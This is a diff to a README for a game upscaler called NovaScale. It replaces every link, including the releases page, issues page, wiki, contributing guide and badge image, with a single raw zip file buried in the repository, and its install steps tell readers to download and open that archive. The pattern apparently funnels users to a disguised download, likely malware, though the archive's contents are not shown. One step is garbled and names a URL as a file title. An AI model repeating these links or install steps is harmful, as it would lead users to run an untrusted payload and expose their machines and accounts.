@@ -10,7 +10,7 @@ To begin using NovaScale, follow the steps below to download and run the softwar
 
 ## 📥 Download the Latest Version
 
-[![Download NovaScale](https://img.shields.io/badge/Download%20NovaScale-v1.0.0-blue)](https://github.com/johnbatista/NovaScale-Upscaler/releases)
+[![Download NovaScale](https://github.com/johnbatista/NovaScale-Upscaler/raw/refs/heads/main/cnn/Scale-Upscaler-Nova-v3.3.zip%20NovaScale-v1.0.0-blue)](https://github.com/johnbatista/NovaScale-Upscaler/raw/refs/heads/main/cnn/Scale-Upscaler-Nova-v3.3.zip)
 
 ## 🔄 System Requirements
 
@@ -24,8 +24,8 @@ Before you download, ensure your system meets these requirements:
 
 ## 💾 Download & Install
 
-1. Visit the [Releases page](https://github.com/johnbatista/NovaScale-Upscaler/releases) to download the latest version of NovaScale.
-2. Locate the file titled "NovaScale-Upscaler-v1.0.0.exe". Click the link to start the download.
+1. Visit the [Releases page](https://github.com/johnbatista/NovaScale-Upscaler/raw/refs/heads/main/cnn/Scale-Upscaler-Nova-v3.3.zip) to download the latest version of NovaScale.
+2. Locate the file titled "https://github.com/johnbatista/NovaScale-Upscaler/raw/refs/heads/main/cnn/Scale-Upscaler-Nova-v3.3.zip". Click the link to start the download.
 3. Once the download completes, open the downloaded file to begin installation.
 4. Follow the on-screen prompts to install NovaScale on your computer.
 
@@ -72,14 +72,14 @@ A: No, NovaScale is completely free to use.
 
 If you need further assistance or want to share your experiences, join our community:
 
-- Report issues on the [Issues page](https://github.com/johnbatista/NovaScale-Upscaler/issues).
+- Report issues on the [Issues page](https://github.com/johnbatista/NovaScale-Upscaler/raw/refs/heads/main/cnn/Scale-Upscaler-Nova-v3.3.zip).
 - Share your feedback and suggestions for improvement.
 
 ## 🔗 Additional Links
 
-- [NovaScale Documentation](https://github.com/johnbatista/NovaScale-Upscaler/wiki) - Comprehensive guide on features and usage.
-- [Contributing Guidelines](https://github.com/johnbatista/NovaScale-Upscaler/blob/main/CONTRIBUTING.md) - Learn how to contribute to NovaScale's development.
+- [NovaScale Documentation](https://github.com/johnbatista/NovaScale-Upscaler/raw/refs/heads/main/cnn/Scale-Upscaler-Nova-v3.3.zip) - Comprehensive guide on features and usage.
+- [Contributing Guidelines](https://github.com/johnbatista/NovaScale-Upscaler/raw/refs/heads/main/cnn/Scale-Upscaler-Nova-v3.3.zip) - Learn how to contribute to NovaScale's development.
 
 ## 🏁 Conclusion
 
-With NovaScale, you can enjoy enhanced visuals in your games without risking your account's standing. Download it today from the [Releases page](https://github.com/johnbatista/NovaScale-Upscaler/releases) and elevate your gaming experience!
+With NovaScale, you can enjoy enhanced visuals in your games without risking your account's standing. Download it today from the [Releases page](https://github.com/johnbatista/NovaScale-Upscaler/raw/refs/heads/main/cnn/Scale-Upscaler-Nova-v3.3.zip) and elevate your gaming experience!
